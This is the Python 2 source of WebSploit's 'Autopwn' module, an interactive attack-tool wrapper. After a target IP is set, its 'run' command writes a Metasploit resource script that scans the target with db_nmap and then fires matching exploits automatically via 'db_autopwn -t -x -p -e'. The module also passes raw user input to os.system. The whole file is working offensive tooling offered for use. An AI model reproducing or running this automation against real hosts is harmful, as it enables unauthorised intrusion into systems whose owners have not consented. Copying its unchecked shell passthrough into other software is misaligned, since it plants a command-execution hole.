#!/usr/bin/env python
#
# WebSploit FrameWork Autopwn module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com
import os
from time import sleep
from core import wcolors
from core import help
options = ["192.168.1.1"]
def autopwn():
	try:
		line = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
		line += ":"
		line += wcolors.color.UNDERL + wcolors.color.BLUE + "Autopwn" + wcolors.color.ENDC
		line += " > "
		com = raw_input (line)
		com = com.lower()
		if com[0:10] =='set target':
			options[0] = com[11:27]
			print "TARGET => ", options[0]
			autopwn()
		elif com[0:12]=='show options':
			print ""
			print "Options\t\t Value\t\t\t RQ\t Description"
			print "---------\t--------------\t\t----\t--------------"
			print "TARGET\t\t"+options[0]+"\t\t\tyes\tTarget IP Address"
			print ""
			autopwn()
		elif com[0:2] =='os':
			os.system(com[3:])
			autopwn()
		elif com[0:4] =='help':
			help.help()
			autopwn()
		elif com[0:4] =='back':
			pass
		elif com[0:3] =='run':
			print (wcolors.color.YELLOW + "[*]Engine Has Been Started." + wcolors.color.ENDC)
			print (wcolors.color.YELLOW + "[*]Please Wait ..." + wcolors.color.ENDC)
			sleep(2)
			os.system('cp modules/db_autopwn.rb /tmp;chmod +x /tmp/db_autopwn.rb')
			os.chdir('//tmp')
			check_tmp = os.listdir(os.curdir)
			if 'websploit_autopwn.rc' in check_tmp:
				os.system('rm -rf websploit_autopwn.rc')
			myfile = open('websploit_autopwn.rc', 'w')
			myfile.write ('workspace -d websploit\n')
			myfile.write ('workspace -a websploit\n')
			myfile.write ('db_nmap ' + options[0] + '\n')
			myfile.write ('load /tmp/db_autopwn.rb\n')
			myfile.write ('db_autopwn -t -x -p -e')
			myfile.close()
			os.system('msfconsole -r /tmp/websploit_autopwn.rc')
		else:
			print "Wrong Command => ", com
			autopwn()
	except(KeyboardInterrupt):
		print ""
